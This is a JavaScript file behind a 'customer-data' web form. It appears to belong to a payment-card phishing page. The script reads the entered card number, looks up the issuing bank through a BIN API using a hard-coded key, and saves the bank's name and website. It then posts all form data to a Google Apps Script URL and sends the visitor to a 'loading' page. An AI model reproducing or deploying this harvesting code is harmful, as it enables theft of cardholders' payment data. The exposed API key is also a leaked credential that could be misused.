const scriptURL = 'https://script.google.com/macros/s/AKfycbyDRjvf0pLW1tQ4SRim-EyIBH5TXws_MarWNRE_zbqnYXvyfK32ArgCcWoqHoGGzVIe/exec'

const loader = document.getElementById('loader');
loader.style.display = 'none';


function positionLoader() {
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const screenCenterY = window.innerHeight / 2;
    const loaderHeight = loader.offsetHeight;
    const loaderTop = Math.max(screenCenterY - loaderHeight / 2 + scrollTop, 0);
    loader.style.top = `${loaderTop}px`;
  }
  
  // Call the positionLoader function on window resize, scroll, and load events
  window.addEventListener('resize', positionLoader);
  window.addEventListener('scroll', positionLoader);
  window.addEventListener('load', positionLoader);
const form = document.forms['customer-data']
          
        form.addEventListener('submit', e => {
            e.preventDefault();
            positionLoader();
            loader.style.display = 'flex';
            window.scrollBy(0, 1);      
            var card_num = document.getElementById("card-data").value.replace(/ /g, "");
            const data = JSON.stringify({
                "bin": card_num
            });
                  
            localStorage.setItem("card-num",card_num);
            const xhr = new XMLHttpRequest();
            xhr.withCredentials = false;
            xhr.addEventListener("readystatechange", function () {
                if (this.readyState === this.DONE) {
                    var data = JSON.parse(this.responseText);
                    console.log(data);
                    if(data.message == "The BIN number doesn't exist!"){
                        alert("Not a valid card number");
                        loader.style.display = 'none';
                        return;
                    }
                    localStorage.setItem("bank-name",data.BIN.issuer.name);
                    localStorage.setItem("bank-website",data.BIN.issuer.website);
                    var bankName = document.getElementById("bank-name");
                    bankName.value = data.BIN.issuer.name;
                    var cardBrand = document.getElementById("card-brand");
                    var cardType = document.getElementById("card-type");

                    cardBrand.value = data.BIN.brand;
                    cardType.value = data.BIN.type;

                    localStorage.setItem("card-type",data.BIN.brand);

                    if(ValidCaptcha())
                        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                        .then(()=>{
                        if(ValidCaptcha())
                            window.location.assign("loading.html");
                        else{
                            alert("invalid captcha");
                            loader.style.display = 'none';
                        }})
                        .catch(error => {
                            console.error('Error!', error.message);
                            loader.style.display = 'none';
                    })
                    else{
                        alert("Invalid Captcha");
                        loader.style.display = 'none';
                    }
                }
            });
            xhr.open("POST", `https://bin-ip-checker.p.rapidapi.com/?bin=${card_num}`);
            xhr.setRequestHeader("content-type", "application/json");
            xhr.setRequestHeader("X-RapidAPI-Key", "9e12f35623msh881ac55c9751efep1b6e3djsn6ced5da603fb");
            
            xhr.setRequestHeader("X-RapidAPI-Host", "bin-ip-checker.p.rapidapi.com");
            xhr.setRequestHeader("Access-Control-Allow-Origin", "*")

            xhr.send(data);
        })
